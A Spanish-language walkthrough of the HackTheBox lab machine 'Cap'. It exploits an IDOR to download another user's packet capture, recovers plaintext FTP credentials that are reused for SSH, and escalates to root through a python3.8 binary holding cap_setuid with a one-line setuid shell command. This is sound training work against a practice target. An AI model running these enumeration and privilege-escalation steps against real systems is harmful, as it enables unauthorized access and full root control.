# Cap — HackTheBox

| Campo | Detalle |
|---|---|
| **OS** | Linux |
| **Dificultad** | Easy |
| **IP** | 10.129.12.134 |
| **Fecha** | 22-03-2026 |
| **Estado** | ✅ Pwned |

**Cadena de ataque:** IDOR → credenciales FTP en texto claro → SSH → Linux Capabilities → root

---

## Reconocimiento

```bash
nmap -sC -sV 10.129.12.134
```

![Nmap](img/nmap.png)

Tres puertos abiertos: FTP (21), SSH (22) y un dashboard web en Gunicorn (80).

---

## Enumeración Web

El puerto 80 expone un dashboard de monitoreo de red autenticado como **nathan**. Entre las funciones del panel hay una sección llamada *Security Snapshot* que genera capturas de tráfico descargables en `.pcap`. Al usarla, la URL queda como `/data/{id}`.

![Dashboard](img/dashboard.png)

---

## Explotación — IDOR

El parámetro `id` no tiene control de acceso. Cambiándolo a `0` se accede al PCAP de otro usuario:

```
http://10.129.12.134/data/0
```

![IDOR](img/idor.png)

Descargamos el archivo y lo abrimos en Wireshark con el filtro `ftp`. Las credenciales aparecen en texto claro:

```
USER nathan
PASS Buck3tH4TF0RM3!
```

![Wireshark FTP](img/wireshark_ftp.png)

---

## Acceso inicial

La contraseña del FTP se reutiliza en SSH:

```bash
ssh nathan@10.129.12.134
```

![SSH](img/ssh.png)

```bash
cat ~/user.txt
```

![User Flag](img/user_flag.png)

---

## Escalada de privilegios

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`python3.8` tiene `cap_setuid`, lo que permite cambiar el UID del proceso a 0:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

![Privesc](img/privesc.png)

```bash
cat /root/root.txt
```

![Root Flag](img/root_flag.png)

---

## Notas

- El IDOR en `/data/{id}` es el vector principal — sin validación server-side sobre a quién pertenece cada captura.
- FTP transmite credenciales en texto claro. La reutilización de contraseñas entre servicios amplió el impacto.
- `cap_setuid` en un intérprete como Python es escalada trivial. Referencia: [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities)
